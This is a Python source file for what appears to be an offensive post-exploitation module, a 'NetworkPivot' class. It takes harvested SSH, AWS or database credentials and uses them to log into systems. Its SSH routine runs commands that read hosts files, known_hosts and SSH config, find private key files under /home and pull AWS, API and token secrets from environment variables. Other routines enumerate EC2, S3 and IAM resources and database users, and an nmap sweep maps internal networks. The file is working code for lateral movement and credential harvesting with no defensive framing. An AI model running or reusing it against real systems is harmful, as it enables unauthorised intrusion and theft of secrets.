import logging
import socket
import subprocess
import concurrent.futures
from typing import Dict, List, Tuple, Optional, Any
import nmap
import paramiko

logger = logging.getLogger(__name__)

class NetworkPivot:
    def __init__(self):
        self.nm = nmap.PortScanner()
        self.discovered_hosts = []
        self.credentials_cache = {}
        
    def pivot_from_credentials(self, credentials: Dict[str, Any]) -> Dict:
        results = {
            "pivoted_systems": [],
            "discovered_services": [],
            "additional_credentials": [],
            "accessible_resources": []
        }
        
        if credentials.get("type") == "ssh":
            ssh_results = self._pivot_ssh(
                credentials["host"],
                credentials["username"],
                credentials["password"]
            )
            results.update(ssh_results)
            
        elif credentials.get("type") == "aws":
            aws_results = self._pivot_aws(credentials)
            results.update(aws_results)
            
        elif credentials.get("type") == "database":
            db_results = self._pivot_database(credentials)
            results.update(db_results)
        
        return results
    
    def _pivot_ssh(self, host: str, username: str, password: str) -> Dict:
        results = {
            "pivoted_systems": [],
            "discovered_services": []
        }
        
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=username, password=password, timeout=10)
            
            commands = [
                ("ip addr | grep -E 'inet ' | awk '{print $2}'", "network_interfaces"),
                ("cat /etc/hosts | grep -v '^#'", "hosts_file"),
                ("ss -tulpn 2>/dev/null | grep LISTEN", "listening_services"),
                ("cat ~/.ssh/known_hosts 2>/dev/null", "known_hosts"),
                ("cat ~/.ssh/config 2>/dev/null", "ssh_config"),
                ("find /home -name '*.pem' -o -name '*.key' 2>/dev/null | head -20", "private_keys"),
                ("env | grep -E '(AWS|AZURE|GCP|API|TOKEN|KEY)'", "environment_vars")
            ]
            
            for cmd, desc in commands:
                stdin, stdout, stderr = ssh.exec_command(cmd)
                output = stdout.read().decode('utf-8').strip()
                
                if output:
                    if desc == "network_interfaces":
                        results["network_segments"] = self._parse_network_interfaces(output)
                    elif desc == "hosts_file":
                        results["internal_hosts"] = self._parse_hosts_file(output)
                    elif desc == "listening_services":
                        results["discovered_services"].extend(self._parse_services(output))
                    elif desc == "known_hosts":
                        results["known_ssh_hosts"] = self._parse_known_hosts(output)
                    elif desc == "private_keys":
                        results["found_keys"] = output.split('\n')
                    elif desc == "environment_vars":
                        results["exposed_credentials"] = self._parse_env_credentials(output)
            
            ssh.close()
            
        except Exception as e:
            logger.error(f"SSH pivot failed for {host}: {e}")
            results["error"] = str(e)
        
        return results
    
    def _pivot_aws(self, credentials: Dict) -> Dict:
        results = {
            "aws_resources": []
        }
        
        try:
            import boto3
            
            session = boto3.Session(
                aws_access_key_id=credentials.get("access_key"),
                aws_secret_access_key=credentials.get("secret_key"),
                region_name=credentials.get("region", "us-east-1")
            )
            
            ec2 = session.client('ec2')
            instances = ec2.describe_instances()
            
            for reservation in instances['Reservations']:
                for instance in reservation['Instances']:
                    results["aws_resources"].append({
                        "type": "ec2_instance",
                        "id": instance['InstanceId'],
                        "state": instance['State']['Name'],
                        "public_ip": instance.get('PublicIpAddress'),
                        "private_ip": instance.get('PrivateIpAddress'),
                        "tags": instance.get('Tags', [])
                    })
            
            s3 = session.client('s3')
            buckets = s3.list_buckets()
            
            for bucket in buckets['Buckets']:
                results["aws_resources"].append({
                    "type": "s3_bucket",
                    "name": bucket['Name'],
                    "creation_date": str(bucket['CreationDate'])
                })
            
            iam = session.client('iam')
            users = iam.list_users()
            
            for user in users['Users']:
                results["aws_resources"].append({
                    "type": "iam_user",
                    "username": user['UserName'],
                    "arn": user['Arn']
                })
                
        except Exception as e:
            logger.error(f"AWS pivot failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def _pivot_database(self, credentials: Dict) -> Dict:
        results = {
            "database_findings": []
        }
        
        db_type = credentials.get("db_type")
        
        if db_type == "mysql":
            results.update(self._pivot_mysql(credentials))
        elif db_type == "postgresql":
            results.update(self._pivot_postgresql(credentials))
        elif db_type == "mongodb":
            results.update(self._pivot_mongodb(credentials))
        
        return results
    
    def _pivot_mysql(self, creds: Dict) -> Dict:
        results = {"mysql_data": []}
        
        try:
            import mysql.connector
            
            conn = mysql.connector.connect(
                host=creds["host"],
                user=creds["username"],
                password=creds["password"],
                port=creds.get("port", 3306)
            )
            
            cursor = conn.cursor()
            
            cursor.execute("SHOW DATABASES")
            databases = cursor.fetchall()
            results["databases"] = [db[0] for db in databases]
            
            cursor.execute("SELECT user, host FROM mysql.user")
            users = cursor.fetchall()
            results["mysql_users"] = [{"user": u[0], "host": u[1]} for u in users]
            
            cursor.close()
            conn.close()
            
        except Exception as e:
            logger.error(f"MySQL pivot failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def _pivot_postgresql(self, creds: Dict) -> Dict:
        results = {"postgresql_data": []}
        
        try:
            import psycopg2
            
            conn = psycopg2.connect(
                host=creds["host"],
                user=creds["username"],
                password=creds["password"],
                port=creds.get("port", 5432)
            )
            
            cursor = conn.cursor()
            
            cursor.execute("SELECT datname FROM pg_database")
            databases = cursor.fetchall()
            results["databases"] = [db[0] for db in databases]
            
            cursor.execute("SELECT usename FROM pg_user")
            users = cursor.fetchall()
            results["postgresql_users"] = [u[0] for u in users]
            
            cursor.close()
            conn.close()
            
        except Exception as e:
            logger.error(f"PostgreSQL pivot failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def _pivot_mongodb(self, creds: Dict) -> Dict:
        results = {"mongodb_data": []}
        
        try:
            import pymongo
            
            if creds["username"] and creds["password"]:
                uri = f"mongodb://{creds['username']}:{creds['password']}@{creds['host']}:{creds.get('port', 27017)}/"
            else:
                uri = f"mongodb://{creds['host']}:{creds.get('port', 27017)}/"
            
            client = pymongo.MongoClient(uri)
            
            databases = client.list_database_names()
            results["databases"] = databases
            
            client.close()
            
        except Exception as e:
            logger.error(f"MongoDB pivot failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def scan_internal_network(self, network_range: str) -> List[Dict]:
        discovered_hosts = []
        
        try:
            logger.info(f"Scanning internal network: {network_range}")
            self.nm.scan(hosts=network_range, arguments='-sn -T4')
            
            for host in self.nm.all_hosts():
                if self.nm[host].state() == 'up':
                    host_info = {
                        "ip": host,
                        "hostname": self.nm[host].hostname(),
                        "state": "up"
                    }
                    discovered_hosts.append(host_info)
            
        except Exception as e:
            logger.error(f"Network scan failed: {e}")
        
        return discovered_hosts
    
    def _parse_network_interfaces(self, output: str) -> List[str]:
        networks = []
        for line in output.split('\n'):
            if line.strip():
                networks.append(line.strip())
        return networks
    
    def _parse_hosts_file(self, output: str) -> List[Dict]:
        hosts = []
        for line in output.split('\n'):
            if line.strip():
                parts = line.split()
                if len(parts) >= 2:
                    hosts.append({"ip": parts[0], "hostname": parts[1]})
        return hosts
    
    def _parse_services(self, output: str) -> List[Dict]:
        services = []
        for line in output.split('\n'):
            if 'LISTEN' in line:
                parts = line.split()
                if len(parts) >= 4:
                    services.append({
                        "protocol": parts[0],
                        "address": parts[3],
                        "service": parts[-1] if len(parts) > 4 else "unknown"
                    })
        return services
    
    def _parse_known_hosts(self, output: str) -> List[str]:
        hosts = []
        for line in output.split('\n'):
            if line.strip():
                parts = line.split()
                if parts:
                    hosts.append(parts[0])
        return list(set(hosts))
    
    def _parse_env_credentials(self, output: str) -> List[Dict]:
        credentials = []
        for line in output.split('\n'):
            if '=' in line:
                key, value = line.split('=', 1)
                credentials.append({"key": key, "value": value[:20] + "..."})
        return credentials